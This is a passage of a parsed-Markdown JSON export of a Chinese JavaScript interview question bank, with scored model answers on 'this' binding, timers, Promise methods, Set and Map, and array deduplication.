当一个函数作为对象的方法被调用时，this指向调用该方法的对象。在这里，sayHello是person对象的方法，所以this指代person，因此可以正确访问person.name","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 当一个函数作为对象的方法被调用时，this指向调用该方法的对象。在这里，sayHello是person对象的方法，所以this指代person，因此可以正确访问person.name","text":" 当一个函数作为对象的方法被调用时，this指向调用该方法的对象。在这里，sayHello是person对象的方法，所以this指代person，因此可以正确访问person.name","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 7. JS 请解释setTimeout和setInterval的区别，并说明如何清除定时器\\n\\n","depth":2,"text":"7. JS 请解释setTimeout和setInterval的区别，并说明如何清除定时器","tokens":[{"type":"text","raw":"7. JS 请解释setTimeout和setInterval的区别，并说明如何清除定时器","text":"7. JS 请解释setTimeout和setInterval的区别，并说明如何清除定时器","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** setTimeout：在指定的延迟时间（毫秒）后执行一次回调函数。示例：setTimeout(() => console.log(\'Delayed\'), 1000);，1 秒后会执行一次回调打印Delayed。\\nsetInterval：按照指定的时间间隔（毫秒）重复执行回调函数。示例：let intervalId = setInterval(() => console.log(\'Repeating\'), 1000);，每隔 1 秒就会执行一次回调打印Repeating。\\n- **1：** 使用clearTimeout清除setTimeout创建的定时器，传入setTimeout返回的定时器 ID。例如：const timeoutId = setTimeout(() => console.log(\'Timeout\'), 2000); clearTimeout(timeoutId);，这样就会取消即将执行的setTimeout回调。\\n          使用clearInterval清除setInterval创建的定时器，传入setInterval返回的定时器 ID，如clearInterval(intervalId);会停止setInterval的重复执行。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** setTimeout：在指定的延迟时间（毫秒）后执行一次回调函数。示例：setTimeout(() => console.log(\'Delayed\'), 1000);，1 秒后会执行一次回调打印Delayed。\\nsetInterval：按照指定的时间间隔（毫秒）重复执行回调函数。示例：let intervalId = setInterval(() => console.log(\'Repeating\'), 1000);，每隔 1 秒就会执行一次回调打印Repeating。\\n","task":false,"loose":false,"text":"**1：** setTimeout：在指定的延迟时间（毫秒）后执行一次回调函数。示例：setTimeout(() => console.log(\'Delayed\'), 1000);，1 秒后会执行一次回调打印Delayed。\\nsetInterval：按照指定的时间间隔（毫秒）重复执行回调函数。示例：let intervalId = setInterval(() => console.log(\'Repeating\'), 1000);，每隔 1 秒就会执行一次回调打印Repeating。","tokens":[{"type":"text","raw":"**1：** setTimeout：在指定的延迟时间（毫秒）后执行一次回调函数。示例：setTimeout(() => console.log(\'Delayed\'), 1000);，1 秒后会执行一次回调打印Delayed。\\n\\nsetInterval：按照指定的时间间隔（毫秒）重复执行回调函数。示例：let intervalId = setInterval(() => console.log(\'Repeating\'), 1000);，每隔 1 秒就会执行一次回调打印Repeating。","text":"**1：** setTimeout：在指定的延迟时间（毫秒）后执行一次回调函数。示例：setTimeout(() => console.log(\'Delayed\'), 1000);，1 秒后会执行一次回调打印Delayed。\\nsetInterval：按照指定的时间间隔（毫秒）重复执行回调函数。示例：let intervalId = setInterval(() => console.log(\'Repeating\'), 1000);，每隔 1 秒就会执行一次回调打印Repeating。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" setTimeout：在指定的延迟时间（毫秒）后执行一次回调函数。示例：setTimeout(() => console.log(\'Delayed\'), 1000);，1 秒后会执行一次回调打印Delayed。\\nsetInterval：按照指定的时间间隔（毫秒）重复执行回调函数。示例：let intervalId = setInterval(() => console.log(\'Repeating\'), 1000);，每隔 1 秒就会执行一次回调打印Repeating。","text":" setTimeout：在指定的延迟时间（毫秒）后执行一次回调函数。示例：setTimeout(() => console.log(\'Delayed\'), 1000);，1 秒后会执行一次回调打印Delayed。\\nsetInterval：按照指定的时间间隔（毫秒）重复执行回调函数。示例：let intervalId = setInterval(() => console.log(\'Repeating\'), 1000);，每隔 1 秒就会执行一次回调打印Repeating。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用clearTimeout清除setTimeout创建的定时器，传入setTimeout返回的定时器 ID。例如：const timeoutId = setTimeout(() => console.log(\'Timeout\'), 2000); clearTimeout(timeoutId);，这样就会取消即将执行的setTimeout回调。\\n          使用clearInterval清除setInterval创建的定时器，传入setInterval返回的定时器 ID，如clearInterval(intervalId);会停止setInterval的重复执行。","task":false,"loose":false,"text":"**1：** 使用clearTimeout清除setTimeout创建的定时器，传入setTimeout返回的定时器 ID。例如：const timeoutId = setTimeout(() => console.log(\'Timeout\'), 2000); clearTimeout(timeoutId);，这样就会取消即将执行的setTimeout回调。\\n        使用clearInterval清除setInterval创建的定时器，传入setInterval返回的定时器 ID，如clearInterval(intervalId);会停止setInterval的重复执行。","tokens":[{"type":"text","raw":"**1：** 使用clearTimeout清除setTimeout创建的定时器，传入setTimeout返回的定时器 ID。例如：const timeoutId = setTimeout(() => console.log(\'Timeout\'), 2000); clearTimeout(timeoutId);，这样就会取消即将执行的setTimeout回调。\\n\\n        使用clearInterval清除setInterval创建的定时器，传入setInterval返回的定时器 ID，如clearInterval(intervalId);会停止setInterval的重复执行。","text":"**1：** 使用clearTimeout清除setTimeout创建的定时器，传入setTimeout返回的定时器 ID。例如：const timeoutId = setTimeout(() => console.log(\'Timeout\'), 2000); clearTimeout(timeoutId);，这样就会取消即将执行的setTimeout回调。\\n    使用clearInterval清除setInterval创建的定时器，传入setInterval返回的定时器 ID，如clearInterval(intervalId);会停止setInterval的重复执行。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用clearTimeout清除setTimeout创建的定时器，传入setTimeout返回的定时器 ID。例如：const timeoutId = setTimeout(() => console.log(\'Timeout\'), 2000); clearTimeout(timeoutId);，这样就会取消即将执行的setTimeout回调。\\n    使用clearInterval清除setInterval创建的定时器，传入setInterval返回的定时器 ID，如clearInterval(intervalId);会停止setInterval的重复执行。","text":" 使用clearTimeout清除setTimeout创建的定时器，传入setTimeout返回的定时器 ID。例如：const timeoutId = setTimeout(() => console.log(\'Timeout\'), 2000); clearTimeout(timeoutId);，这样就会取消即将执行的setTimeout回调。\\n    使用clearInterval清除setInterval创建的定时器，传入setInterval返回的定时器 ID，如clearInterval(intervalId);会停止setInterval的重复执行。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 8. Promise 的常用方法\\n\\n","depth":2,"text":"8. Promise 的常用方法","tokens":[{"type":"text","raw":"8. Promise 的常用方法","text":"8. Promise 的常用方法","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（7 分）\\n\\n","depth":4,"text":"解答（7 分）","tokens":[{"type":"text","raw":"解答（7 分）","text":"解答（7 分）","escaped":false}]},{"type":"list","raw":"- **1：** Promise.resolve(value)：返回一个已解决的 Promise，如果 value 是一个 Promise，返回的 Promise 会继承其状态。\\n- **1：** Promise.reject(reason)：返回一个已拒绝的 Promise，带有拒绝的原因。\\n- **1：** Promise.all(iterable)：接收一个可迭代对象，返回一个新的 Promise，当所有 Promise 都成功时返回结果数组，若有任何 Promise 失败，返回的 Promise 会立即失败。\\n- **1：** Promise.race(iterable)：返回一个 Promise，它会在第一个完成的 Promise 状态改变时返回该 Promise 的结果（无论是成功还是失败）。\\n- **1：** Promise.allSettled(iterable)：返回一个新的 Promise，在所有输入的 Promise 完成时返回，结果包含每个 Promise 的状态及其结果。\\n- **1：** Promise.any(iterable)：返回一个新的 Promise，它会在第一个成功的 Promise 完成时返回成功结果，如果所有的 Promise 都失败，则返回一个拒绝的 Promise。\\n- **1：** Promise.finally(onFinally)：无论 Promise 成功或失败，都会执行 onFinally 回调，常用于清理操作。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Promise.resolve(value)：返回一个已解决的 Promise，如果 value 是一个 Promise，返回的 Promise 会继承其状态。\\n","task":false,"loose":false,"text":"**1：** Promise.resolve(value)：返回一个已解决的 Promise，如果 value 是一个 Promise，返回的 Promise 会继承其状态。","tokens":[{"type":"text","raw":"**1：** Promise.resolve(value)：返回一个已解决的 Promise，如果 value 是一个 Promise，返回的 Promise 会继承其状态。","text":"**1：** Promise.resolve(value)：返回一个已解决的 Promise，如果 value 是一个 Promise，返回的 Promise 会继承其状态。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Promise.resolve(value)：返回一个已解决的 Promise，如果 value 是一个 Promise，返回的 Promise 会继承其状态。","text":" Promise.resolve(value)：返回一个已解决的 Promise，如果 value 是一个 Promise，返回的 Promise 会继承其状态。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Promise.reject(reason)：返回一个已拒绝的 Promise，带有拒绝的原因。\\n","task":false,"loose":false,"text":"**1：** Promise.reject(reason)：返回一个已拒绝的 Promise，带有拒绝的原因。","tokens":[{"type":"text","raw":"**1：** Promise.reject(reason)：返回一个已拒绝的 Promise，带有拒绝的原因。","text":"**1：** Promise.reject(reason)：返回一个已拒绝的 Promise，带有拒绝的原因。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Promise.reject(reason)：返回一个已拒绝的 Promise，带有拒绝的原因。","text":" Promise.reject(reason)：返回一个已拒绝的 Promise，带有拒绝的原因。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Promise.all(iterable)：接收一个可迭代对象，返回一个新的 Promise，当所有 Promise 都成功时返回结果数组，若有任何 Promise 失败，返回的 Promise 会立即失败。\\n","task":false,"loose":false,"text":"**1：** Promise.all(iterable)：接收一个可迭代对象，返回一个新的 Promise，当所有 Promise 都成功时返回结果数组，若有任何 Promise 失败，返回的 Promise 会立即失败。","tokens":[{"type":"text","raw":"**1：** Promise.all(iterable)：接收一个可迭代对象，返回一个新的 Promise，当所有 Promise 都成功时返回结果数组，若有任何 Promise 失败，返回的 Promise 会立即失败。","text":"**1：** Promise.all(iterable)：接收一个可迭代对象，返回一个新的 Promise，当所有 Promise 都成功时返回结果数组，若有任何 Promise 失败，返回的 Promise 会立即失败。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Promise.all(iterable)：接收一个可迭代对象，返回一个新的 Promise，当所有 Promise 都成功时返回结果数组，若有任何 Promise 失败，返回的 Promise 会立即失败。","text":" Promise.all(iterable)：接收一个可迭代对象，返回一个新的 Promise，当所有 Promise 都成功时返回结果数组，若有任何 Promise 失败，返回的 Promise 会立即失败。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Promise.race(iterable)：返回一个 Promise，它会在第一个完成的 Promise 状态改变时返回该 Promise 的结果（无论是成功还是失败）。\\n","task":false,"loose":false,"text":"**1：** Promise.race(iterable)：返回一个 Promise，它会在第一个完成的 Promise 状态改变时返回该 Promise 的结果（无论是成功还是失败）。","tokens":[{"type":"text","raw":"**1：** Promise.race(iterable)：返回一个 Promise，它会在第一个完成的 Promise 状态改变时返回该 Promise 的结果（无论是成功还是失败）。","text":"**1：** Promise.race(iterable)：返回一个 Promise，它会在第一个完成的 Promise 状态改变时返回该 Promise 的结果（无论是成功还是失败）。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Promise.race(iterable)：返回一个 Promise，它会在第一个完成的 Promise 状态改变时返回该 Promise 的结果（无论是成功还是失败）。","text":" Promise.race(iterable)：返回一个 Promise，它会在第一个完成的 Promise 状态改变时返回该 Promise 的结果（无论是成功还是失败）。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Promise.allSettled(iterable)：返回一个新的 Promise，在所有输入的 Promise 完成时返回，结果包含每个 Promise 的状态及其结果。\\n","task":false,"loose":false,"text":"**1：** Promise.allSettled(iterable)：返回一个新的 Promise，在所有输入的 Promise 完成时返回，结果包含每个 Promise 的状态及其结果。","tokens":[{"type":"text","raw":"**1：** Promise.allSettled(iterable)：返回一个新的 Promise，在所有输入的 Promise 完成时返回，结果包含每个 Promise 的状态及其结果。","text":"**1：** Promise.allSettled(iterable)：返回一个新的 Promise，在所有输入的 Promise 完成时返回，结果包含每个 Promise 的状态及其结果。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Promise.allSettled(iterable)：返回一个新的 Promise，在所有输入的 Promise 完成时返回，结果包含每个 Promise 的状态及其结果。","text":" Promise.allSettled(iterable)：返回一个新的 Promise，在所有输入的 Promise 完成时返回，结果包含每个 Promise 的状态及其结果。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Promise.any(iterable)：返回一个新的 Promise，它会在第一个成功的 Promise 完成时返回成功结果，如果所有的 Promise 都失败，则返回一个拒绝的 Promise。\\n","task":false,"loose":false,"text":"**1：** Promise.any(iterable)：返回一个新的 Promise，它会在第一个成功的 Promise 完成时返回成功结果，如果所有的 Promise 都失败，则返回一个拒绝的 Promise。","tokens":[{"type":"text","raw":"**1：** Promise.any(iterable)：返回一个新的 Promise，它会在第一个成功的 Promise 完成时返回成功结果，如果所有的 Promise 都失败，则返回一个拒绝的 Promise。","text":"**1：** Promise.any(iterable)：返回一个新的 Promise，它会在第一个成功的 Promise 完成时返回成功结果，如果所有的 Promise 都失败，则返回一个拒绝的 Promise。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Promise.any(iterable)：返回一个新的 Promise，它会在第一个成功的 Promise 完成时返回成功结果，如果所有的 Promise 都失败，则返回一个拒绝的 Promise。","text":" Promise.any(iterable)：返回一个新的 Promise，它会在第一个成功的 Promise 完成时返回成功结果，如果所有的 Promise 都失败，则返回一个拒绝的 Promise。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Promise.finally(onFinally)：无论 Promise 成功或失败，都会执行 onFinally 回调，常用于清理操作。","task":false,"loose":false,"text":"**1：** Promise.finally(onFinally)：无论 Promise 成功或失败，都会执行 onFinally 回调，常用于清理操作。","tokens":[{"type":"text","raw":"**1：** Promise.finally(onFinally)：无论 Promise 成功或失败，都会执行 onFinally 回调，常用于清理操作。","text":"**1：** Promise.finally(onFinally)：无论 Promise 成功或失败，都会执行 onFinally 回调，常用于清理操作。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Promise.finally(onFinally)：无论 Promise 成功或失败，都会执行 onFinally 回调，常用于清理操作。","text":" Promise.finally(onFinally)：无论 Promise 成功或失败，都会执行 onFinally 回调，常用于清理操作。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 9. 解释 Set 和 Map 的使用及区别\\n\\n","depth":2,"text":"9. 解释 Set 和 Map 的使用及区别","tokens":[{"type":"text","raw":"9. 解释 Set 和 Map 的使用及区别","text":"9. 解释 Set 和 Map 的使用及区别","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：W5\\n\\n","depth":4,"text":"级别：W5","tokens":[{"type":"text","raw":"级别：W5","text":"级别：W5","escaped":false}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** Set：是一个集合，用于存储不重复的值，按照插入顺序排列。\\n- **1：** Map：是一个键值对集合，用于存储键值对，可以存储任何类型的键和值。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Set：是一个集合，用于存储不重复的值，按照插入顺序排列。\\n","task":false,"loose":false,"text":"**1：** Set：是一个集合，用于存储不重复的值，按照插入顺序排列。","tokens":[{"type":"text","raw":"**1：** Set：是一个集合，用于存储不重复的值，按照插入顺序排列。","text":"**1：** Set：是一个集合，用于存储不重复的值，按照插入顺序排列。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Set：是一个集合，用于存储不重复的值，按照插入顺序排列。","text":" Set：是一个集合，用于存储不重复的值，按照插入顺序排列。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Map：是一个键值对集合，用于存储键值对，可以存储任何类型的键和值。","task":false,"loose":false,"text":"**1：** Map：是一个键值对集合，用于存储键值对，可以存储任何类型的键和值。","tokens":[{"type":"text","raw":"**1：** Map：是一个键值对集合，用于存储键值对，可以存储任何类型的键和值。","text":"**1：** Map：是一个键值对集合，用于存储键值对，可以存储任何类型的键和值。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Map：是一个键值对集合，用于存储键值对，可以存储任何类型的键和值。","text":" Map：是一个键值对集合，用于存储键值对，可以存储任何类型的键和值。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n// Set\\nlet set = new Set();\\nset.add(1);\\nset.add(2);\\nset.add(2); // 会被忽略\\nconsole.log(set); // Set { 1, 2 }\\n\\n// Map\\nlet map = new Map();\\nmap.set(\'name\', \'Alice\');\\nmap.set(\'age\', 25);\\nconsole.log(map.get(\'name\')); // Alice\\n\\n```","lang":"js","text":"// Set\\nlet set = new Set();\\nset.add(1);\\nset.add(2);\\nset.add(2); // 会被忽略\\nconsole.log(set); // Set { 1, 2 }\\n\\n// Map\\nlet map = new Map();\\nmap.set(\'name\', \'Alice\');\\nmap.set(\'age\', 25);\\nconsole.log(map.get(\'name\')); // Alice\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 10. 请写出几个 JavaScript 函数，用于实现数组去重\\n\\n","depth":2,"text":"10. 请写出几个 JavaScript 函数，用于实现数组去重","tokens":[{"type":"text","raw":"10. 请写出几个 JavaScript 函数，用于实现数组去重","text":"10. 请写出几个 JavaScript 函数，用于实现数组去重","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（8 分）\\n\\n","depth":4,"text":"解答（8 分）","tokens":[{"type":"text","raw":"解答（8 分）","text":"解答（8 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** 方法一：使用Set对象（ES6 及以上）","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 方法一：使用Set对象（ES6 及以上）","task":false,"loose":false,"text":"**1：** 方法一：使用Set对象（ES6 及以上）","tokens":[{"type":"text","raw":"**1：** 方法一：使用Set对象（ES6 及以上）","text":"**1：** 方法一：使用Set对象（ES6 及以上）","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 方法一：使用Set对象（ES6 及以上）","text":" 方法一：使用Set对象（ES6 及以上）","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n//原理：Set是一种新的数据结构，它类似于数组，但是成员的值都是唯一的。可以将数组转换为Set，然后再转换回数组来实现去重。\\nfunction uniqueArray(arr) {\\n    return [...new Set(arr)];\\n}\\nlet array = [1, 2, 2, 3, 4, 4];\\nconsole.log(uniqueArray(array)); // 输出[1, 2, 3, 4]\\n//解释：new Set(array)会创建一个Set对象，其中包含了array中的所有元素，并且自动去重。然后，通过扩展运算符...将Set对象转换回数组，得到去重后的结果。\\n```","lang":"js","text":"//原理：Set是一种新的数据结构，它类似于数组，但是成员的值都是唯一的。可以将数组转换为Set，然后再转换回数组来实现去重。\\nfunction uniqueArray(arr) {\\n    return [...new Set(arr)];\\n}\\nlet array = [1, 2, 2, 3, 4, 4];\\nconsole.log(uniqueArray(array)); // 输出[1, 2, 3, 4]\\n//解释：new Set(array)会创建一个Set对象，其中包含了array中的所有元素，并且自动去重。然后，通过扩展运算符...将Set对象转换回数组，得到去重后的结果。"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 方法二：使用循环和一个新数组","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 方法二：使用循环和一个新数组","task":false,"loose":false,"text":"**1：** 方法二：使用循环和一个新数组","tokens":[{"type":"text","raw":"**1：** 方法二：使用循环和一个新数组","text":"**1：** 方法二：使用循环和一个新数组","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 方法二：使用循环和一个新数组","text":" 方法二：使用循环和一个新数组","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction uniqueArray(arr) {\\n    let newArray = [];\\n    for (let i = 0; i < arr.length; i++) {\\n        if (!newArray.includes(arr[i])) {\\n            newArray.push(arr[i]);\\n        }\\n    }\\n    return newArray;\\n}\\nlet array = [1, 2, 2, 3, 4, 4];\\n    console.log(uniqueArray(array)); // 输出[1, 2, 3, 4]\\n```","lang":"js","text":"function uniqueArray(arr) {\\n    let newArray = [];\\n    for (let i = 0; i < arr.length; i++) {\\n        if (!newArray.includes(arr[i])) {\\n            newArray.push(arr[i]);\\n        }\\n    }\\n    return newArray;\\n}\\nlet array = [1, 2, 2, 3, 4, 4];\\n    console.log(uniqueArray(array)); // 输出[1, 2, 3, 4]"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 方法三：使用filter方法和indexOf函数","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 方法三：使用filter方法和indexOf函数","task":false,"loose":false,"text":"**2：** 方法三：使用filter方法和indexOf函数","tokens":[{"type":"text","raw":"**2：** 方法三：使用filter方法和indexOf函数","text":"**2：** 方法三：使用filter方法和indexOf函数","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 方法三：使用filter方法和indexOf函数","text":" 方法三：使用filter方法和indexOf函数","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n//原理：filter方法用于过滤数组中的元素，indexOf函数用于查找元素在数组中的首次出现位置。通过filter方法遍历数组，只保留首次出现的元素，从而实现去重。\\nlet array = [1, 2, 2, 3, 4, 4];\\nlet uniqueArray = array.filter((element, index, self) => {\\n    return self.indexOf(element) === index;\\n});\\nconsole.log(uniqueArray);\\n//解释：filter方法的回调函数接收三个参数：element（当前元素）、index（当前元素的索引）和self（数组本身）。在回调函数中，self.indexOf(element)会查找element在数组中的首次出现位置。如果这个位置等于当前元素的索引index，说明这个元素是首次出现的，filter方法会保留这个元素；否则，就过滤掉这个元素。最终filter方法返回一个新的去重后的数组。\\n```","lang":"js","text":"//原理：filter方法用于过滤数组中的元素，indexOf函数用于查找元素在数组中的首次出现位置。通过filter方法遍历数组，只保留首次出现的元素，从而实现去重。\\nlet array = [1, 2, 2, 3, 4, 4];\\nlet uniqueArray = array.filter((element, index, self) => {\\n    return self.indexOf(element) === index;\\n});\\nconsole.log(uniqueArray);\\n//解释：filter方法的回调函数接收三个参数：element（当前元素）、index（当前元素的索引）和self（数组本身）。在回调函数中，self.indexOf(element)会查找element在数组中的首次出现位置。如果这个位置等于当前元素的索引index，说明这个元素是首次出现的，filter方法会保留这个元素；否则，就过滤掉这个元素。最终filter方法返回一个新的去重后的数组。"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 方法四：使用reduce方法","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 方法四：使用reduce方法","task":false,"loose":false,"text":"**2：** 方法四：使用reduce方法","tokens":[{"type":"text","raw":"**2：** 方法四：使用reduce方法","text":"**2：** 方法四：使用reduce方法","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 方法四：使用reduce方法","text":" 方法四：使用reduce方法","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n//原理：reduce方法用于对数组中的每个元素执行一个由您提供的reducer函数（升序执行），将其结果汇总为单个返回值。可以利用reduce方法来构建一个新的去重数组。\\nlet array = [1, 2, 2, 3, 4, 4];\\nlet uniqueArray = array.reduce((acc, cur) => {\\n    if (!acc.includes(cur)) {\\n        acc.push(cur);\\n    }\\n    return acc;\\n}, []);\\nconsole.log(uniqueArray);\\n//解释：reduce方法的第一个参数是一个reducer函数，它接收两个参数：acc（累加器，初始值是一个空数组[]）和cur（当前元素）。在reducer函数中，如果acc数组不包含cur元素（acc.includes(cur)返回false），就将cur添加到acc中。最后，reduce方法返回acc，即去重后的数组。\\n```","lang":"js","text":"//原理：reduce方法用于对数组中的每个元素执行一个由您提供的reducer函数（升序执行），将其结果汇总为单个返回值。可以利用reduce方法来构建一个新的去重数组。\\nlet array = [1, 2, 2, 3, 4, 4];\\nlet uniqueArray = array.reduce((acc, cur) => {\\n    if (!acc.includes(cur)) {\\n        acc.push(cur);\\n    }\\n    return acc;\\n}, []);\\nconsole.log(uniqueArray);\\n//解释：reduce方法的第一个参数是一个reducer函数，它接收两个参数：acc（累加器，初始值是一个空数组[]）和cur（当前元素）。在reducer函数中，如果acc数组不包含cur元素（acc.includes(cur)返回false），就将cur添加到acc中。最后，reduce方法返回acc，即去重后的数组。"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 方法五：使用Object对象（以元素为键）","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 方法五：使用Object对象（以元素为键）","task":false,"loose":false,"text":"**2：** 方法五：使用Object对象（以元素为键）","tokens":[{"type":"text","raw":"**2：** 方法五：使用Object对象（以元素为键）","text":"**2：** 方法五：使用Object对象（以元素为键）","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 方法五：使用Object对象（以元素为键）","text":" 